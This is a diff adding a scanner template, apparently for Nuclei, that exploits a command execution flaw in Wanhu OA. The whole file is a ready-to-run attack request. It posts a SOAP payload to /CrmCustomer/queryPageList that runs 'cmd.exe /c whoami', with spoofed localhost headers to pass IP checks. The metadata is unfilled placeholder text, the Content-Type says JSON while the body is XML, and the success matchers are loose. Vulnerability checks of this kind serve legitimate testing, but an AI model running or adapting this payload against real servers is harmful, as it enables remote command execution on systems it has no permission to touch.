@@ -1,0 +1,45 @@
+id: wanhu-OA-queryPageList-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: oa万户命令执行
+  reference:
+    - https://github.com/xinyisleep/pocscan/blob/ee0c74e68ec95b82a4e4ebcdb961d6ed18a44b77/%E4%B8%87%E6%88%B7oa/oa%E4%B8%87%E6%88%B7%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.py#L22
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /CrmCustomer/queryPageList HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 621
+        Content-Type: application/json;charset=UTF-8
+        sec-ch-ua-mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+        X-Forwarded-For: 127.0.0.1
+        X-Originating : 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        Connection: close
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://utility.template.freemarker" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <util:exec soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+        <arguments xsi:type="xst:ArrayOf_xsd_anyType" soapenc:arrayType="xsd:anyType[]">
+        <cmd xsi:type="soapenc:string">
+        c:\windows\system32\cmd.exe /c whoami</cmd>
+        </arguments>
+        </util:exec>
+        </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - '<?xml version="1.0"'
